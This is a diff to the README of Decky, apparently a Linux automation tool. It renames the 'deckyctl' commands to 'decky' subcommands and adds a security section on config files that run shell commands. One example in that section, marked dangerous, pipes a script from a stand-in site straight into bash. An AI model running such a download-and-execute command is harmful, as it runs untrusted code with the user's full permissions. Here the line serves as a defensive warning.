@@ -96,28 +96,28 @@ sudo udevadm control --reload-rules
 
 ## Usage
 
-### Service Management with deckyctl
+### Service Management
 
-When installed as a service, use `deckyctl` to manage Decky:
+When installed as a service, use the `decky` command to manage Decky:
 
 ```bash
 # Control commands
-deckyctl start          # Start the service
-deckyctl stop           # Stop the service
-deckyctl restart        # Restart the service
-deckyctl status         # Check service status
-deckyctl logs           # View live logs
+decky start             # Start the service
+decky stop              # Stop the service
+decky restart           # Restart the service
+decky status            # Check service status
+decky logs              # View live logs
 
 # Configuration management
-deckyctl edit           # Edit current config (auto-reloads)
-deckyctl list           # List available configs
-deckyctl use kde        # Switch to different config
-deckyctl validate       # Validate current config
+decky config list       # List available configs
+decky config edit       # Edit current config (auto-reloads)
+decky config use kde    # Switch to different config
+decky config validate   # Validate current config
 
 # Create and use custom configs
 cp ~/.decky/configs/default.yaml ~/.decky/configs/work.yaml
-deckyctl edit work
-deckyctl use work
+decky config edit work
+decky config use work
 ```
 
 ### Direct Usage (without service)
@@ -326,15 +326,15 @@ With the service setup, switching between configs is easy:
 
 ```bash
 # List available configs
-deckyctl list
+decky config list
 
 # Switch between configs instantly
-deckyctl use work      # Work setup
-deckyctl use gaming    # Gaming setup
-deckyctl use streaming  # Streaming setup
+decky config use work      # Work setup
+decky config use gaming    # Gaming setup
+decky config use streaming # Streaming setup
 
 # Edit any config
-deckyctl edit work
+decky config edit work
 ```
 
 ### Configuration Location
@@ -372,10 +372,61 @@ systemctl --user status decky   # Check status
 systemctl --user enable decky   # Enable auto-start (done by installer)
 systemctl --user disable decky  # Disable auto-start
 
-# Or use deckyctl
-deckyctl enable   # Enable auto-start
-deckyctl disable  # Disable auto-start
+# Or use the decky command
+decky enable    # Enable auto-start
+decky disable   # Disable auto-start
 ```
+
+## Security Considerations
+
+### ⚠️ Important Security Notice
+
+**Decky is designed as a personal automation tool and executes commands with your full user permissions.**
+
+Key security principles:
+
+1. **Configuration files are code** - YAML configs can execute arbitrary shell commands via the `command` action type
+1. **Only use trusted configs** - Never load configuration files from untrusted sources
+1. **Review configs before use** - Always inspect YAML files before using them, especially from others
+1. **User responsibility model** - Decky provides powerful automation, which requires responsible use
+
+### Best Practices
+
+```yaml
+# ✅ SAFE - Commands you control
+action:
+  type: command
+  command: "firefox https://github.com"
+
+# ⚠️ REVIEW CAREFULLY - Dynamic commands
+action:
+  type: command
+  command: "notify-send 'CPU' \"$(top -bn1 | grep 'Cpu(s)')\""
+
+# ❌ DANGEROUS - Never use untrusted input
+# Don't create configs that execute downloaded scripts
+action:
+  type: command
+  command: "curl unknown-site.com/script.sh | bash"
+```
+
+### Version Control Your Configs
+
+Keep your configurations in git and review changes:
+
+```bash
+cd ~/.decky/configs
+git init
+git add *.yaml
+git commit -m "Initial Decky configs"
+```
+
+This allows you to:
+
+- Track changes over time
+- Review diffs before applying updates
+- Rollback if something breaks
+- Share configs safely with others (after review)
 
 ## Troubleshooting
 
